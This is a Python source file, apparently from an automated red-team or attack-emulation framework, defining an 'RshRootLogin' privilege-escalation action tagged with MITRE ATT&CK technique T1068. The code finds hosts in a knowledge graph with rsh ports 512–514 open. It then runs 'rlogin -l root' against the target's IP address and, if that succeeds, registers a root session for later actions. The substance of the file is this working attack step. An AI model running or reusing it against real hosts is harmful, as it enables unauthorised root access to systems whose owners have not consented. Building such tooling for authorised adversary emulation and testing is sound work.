from typing import Any, Union

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.action_utils import shell
from action_state_interface.exec import ActionExecutionError, ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, Pattern
from kg_api.query import Query
from Session import SessionManager
from motifs import ActionInputMotif, ActionOutputMotif


class RshRootLogin(Action):
    """
    Implementation of privilege escalation using rshclient.
    """

    def __init__(self):
        super().__init__("RshRootLogin", "T1068", "TA0004", ["loud", "fast"])
        self.noise = 0.8
        self.impact = 0.8
        self.input_motif = self.build_input_motif()
        self.output_motif = self.build_output_motif()

    @classmethod
    def build_input_motif(cls) -> ActionInputMotif:
        """
        Build the input motif for RshRootLogin.
        """
        input_motif = ActionInputMotif(
            name="InputMotif_RshRootLogin",
            description="Input motif for RshRootLogin"
        )

        input_motif.add_template(
            template_name="existing_asset",
            entity=Entity('Asset', alias='asset'),
        )
        
        input_motif.add_template(
            template_name="existing_port",
            entity=Entity('OpenPort', alias='port'),
            match_on="existing_asset",
            relationship_type="has",
            invert_relationship=True,
        )
                
        return input_motif


    @classmethod
    def build_output_motif(cls) -> ActionOutputMotif:
        """
        Build the output motif for RshRootLogin.
        """
        output_motif = ActionOutputMotif(
            name="OutputMotif_RshRootLogin",
            description="Output motif for RshRootLogin"
        )
        
        output_motif.add_template(
            template_name="discovered_session",
            entity=Entity('Session', alias='session', protocol='rsh'),
            relationship_type="executes_on",
            match_on=Entity('OpenPort', alias='port'),
            expected_attributes=["id"],
        )

        return output_motif

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action.
        """
        return [f"Utilise RSH in an attempt to obtain root access on {pattern.get('asset').get('ip_address')}"]

    def get_target_query(self) -> Query:
        """
        get_target_patterns check to identify rsh ports.
        """
        query = self.input_motif.get_query()
        query.where(self.input_motif.get_template('existing_port').entity.number.is_in([512, 513, 514]))
        query.ret_all()
        query.limit(1)
        return query

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Use the rsh client to obtain a root session.
        """
        if not len(pattern):
            raise ActionExecutionError

        ip_address = pattern._patterns[0].get('asset').get('ip_address')

        result = shell('rlogin', ['-l', 'root', ip_address])
        exit_status = result.exit_status
        if exit_status:
            raise ActionExecutionError
        else:
            sess_id = sessions.add_session({"host": ip_address, "username": 'root'})
            result.session = sess_id
            return result

    def parse_output(self, output: ActionExecutionResult) -> dict:
        """
        Parse the output of the RshRootLogin action.
        """
        return {
            "session": output.session,
        }

    def populate_output_motif(self, pattern: Pattern, discovered_data: dict) -> StateChangeSequence:
        """
        Populate the output motif for RshRootLogin.
        """
        self.output_motif.reset_context()
        changes: StateChangeSequence = []

        session_change = self.output_motif.instantiate(
            template_name="discovered_session",
            match_on_override=pattern.get('port'),
            id=discovered_data["session"],
        )
        changes.append(session_change)
        return changes

    def capture_state_change(self, artefacts: ArtefactManager, pattern: Pattern, output: Any):
        """
        Add the rsh session to the knowledge graph.
        rsh session is attached to the port.
        """
        discovered_data = self.parse_output(output)
        changes = self.populate_output_motif(pattern, discovered_data)
        return changes
